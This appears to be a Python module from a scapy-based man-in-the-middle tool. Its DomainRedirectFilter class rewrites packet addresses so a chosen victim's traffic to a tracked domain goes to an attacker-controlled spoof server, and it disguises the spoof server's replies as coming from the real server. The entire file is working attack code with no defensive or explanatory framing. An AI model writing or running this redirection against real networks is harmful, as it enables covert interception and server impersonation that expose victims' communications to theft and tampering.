from scapy.all import IP, TCP, UDP

class DomainRedirectFilter:
    def __init__(self, domain_tracker, victim_ip, spoof_ip, attacker_ip, logger=None):
        self.domain_tracker = domain_tracker
        self.victim_ip = victim_ip
        self.attacker_ip = attacker_ip
        self.spoof_ip = spoof_ip
        self.logger = logger

        # (victim_ip, v_sport, s_dport, proto) → real_server_ip
        self.flows = {}

    def log(self, msg):
        if self.logger:
            self.logger(msg)

    def __call__(self, pkt):
        if not pkt.haslayer(IP):
            return False

        ip = pkt[IP]

        if pkt.haslayer(TCP):
            proto = "TCP"
            l4 = pkt[TCP]
        elif pkt.haslayer(UDP):
            proto = "UDP"
            l4 = pkt[UDP]
        else:
            return False

        sport = l4.sport
        dport = l4.dport

        # ───── VICTIM → REAL SERVER ─────
        if ip.src == self.victim_ip and ip.dst in self.domain_tracker.ips_v4:
            self.flows[(self.victim_ip, sport, dport, proto)] = ip.dst

            ip.src = self.attacker_ip
            ip.dst = self.spoof_ip

            del ip.chksum
            del l4.chksum

            self.log("[MITM] Victim → Spoof server")
            return False

        # ───── SPOOF SERVER → ATTACKER ─────
        if ip.src == self.spoof_ip and ip.dst == self.attacker_ip:
            key = (self.victim_ip, dport, sport, proto)
            if key not in self.flows:
                return False

            real_ip = self.flows[key]

            ip.src = real_ip
            ip.dst = self.victim_ip

            del ip.chksum
            del l4.chksum

            self.log("[MITM] Spoof server → Victim")
            return False

        return False